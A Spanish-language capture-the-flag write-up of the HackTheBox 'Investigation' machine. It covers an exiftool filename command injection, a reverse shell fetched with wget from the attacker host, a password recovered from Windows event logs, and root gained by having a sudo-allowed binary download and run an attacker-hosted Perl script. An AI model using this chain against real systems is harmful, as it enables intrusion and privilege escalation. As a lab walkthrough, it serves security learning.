---
title: Investigation
date: 2023-01-28 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: [Exiftools, evtx, binary]     # TAG names should always be lowercase
---

```shell
# Nmap 7.92 scan initiated Sat Jan 28 16:27:42 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.197
Nmap scan report for 10.10.11.197
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 28 16:27:53 2023 -- 1 IP address (1 host up) scanned in 11.03 seconds
```
En el puerto 80 nos encontramos una página donde podemos subir una imagen y por detrás esta usa exiftool para mostrarnos los metadatos de esta. Vemos que la versión es 12.27 que tiene una vulnerabilidad, más información se puede ver este [Link](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429 "link"), aquí menciona que añadiendo un | al final del nombre de la imagen se puede ejecutar comandos. Para esto nos apoyamos en burpsuite para cambiar el nombre de la imagen.

![imagen1](/assets/images/investigator/investigator1.png)

Para entablarnos una conexión nos compartimos un archivo bash en nuestra máquina y después con wget podemos descargarnos el archivo y ejecutarlo.

![imagen2](/assets/images/investigator/investigator2.png)

![imagen3](/assets/images/investigator/investigator3.png)

Dentro de la máquina nos ponermos a enumerar archivos para el usuario smorton y nos encontramos con el archivo `Windows Event Logs for Analysis.msg`.

```shell
www-data@investigation:/$ find -user smorton 2>/dev/null | grep -vE "proc|sys|run|dev"
./home/smorton
./usr/local/investigation/Windows Event Logs for Analysis.msg
```

Investigando un poco sobre la extensión, se menciona que es un archivo que puede ser abierto por Outlook Desktop de windows, por lo que procedo a pasar el archivo a la máquina windows. Igualmente se podría haber hecho con `thunderbird` o `evtx-linux`. Dentro del correo encontramos un archivo comprimido adjunto que es un archvo con logs de windows.

![imagen4](/assets/images/investigator/investigator4.png)

Dentro de estos logs en el id del evento 4625 se encontró un login fallido cuando el usuario smorton intentó logearse poniendo la contraseña como usuario.

![imagen5](/assets/images/investigator/investigator5.png)

Usamos esta contraseña para iniciar sesión por ssh. Dentro de la máquina con smorton tienen permisos de ejecutar `binary` como root, este binario no es común en linux, por lo que procedemos a traerlo a nuestra máquina por netcat.

```shell
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```
Abrimos el binario con ghidra para ver el código y su funcionalidad.

```c
undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

![imagen6](/assets/images/investigator/investigator6.png)

Este binario lo que hace es:

1. La función comienza comprobando el valor del primer parámetro, param_1. Si no es igual a 3, el programa imprime "Saliendo". Si no es igual a 3, el programa imprime "Exiting... " y sale con el estado 0 utilizando la función exit(0).
2. Busca por getuid(), si el programa corre por root, entonces sigue, en todo caso se acaba el programa.
3. Compara la cadena en la dirección de memoria param_2 + 0x10 con la cadena "lDnxUysaQn", si es igual el programa sigue.
4. Se crea un archivo "lDnxUysaQn" en modo de escritura binario utilizando la función fopen, y asigna el puntero del fichero a la variable __stream.
5. Utiliza curl para buscar por la ruta ingresada en el segundo argumento y si el archivo se encuentra, entonces el programa construye una cadena "perl ./lDnxUysaQn"

Entonces finalmente ejecutamos el binario hosteando un archivo pearl con `exec("/bin/bash")` y tendríamos una shell con root.

```shell
smorton@investigation:~$ sudo  /usr/bin/binary http://10.10.14.6/shell.pl lDnxUysaQn
Running... 
# whoami
root
```
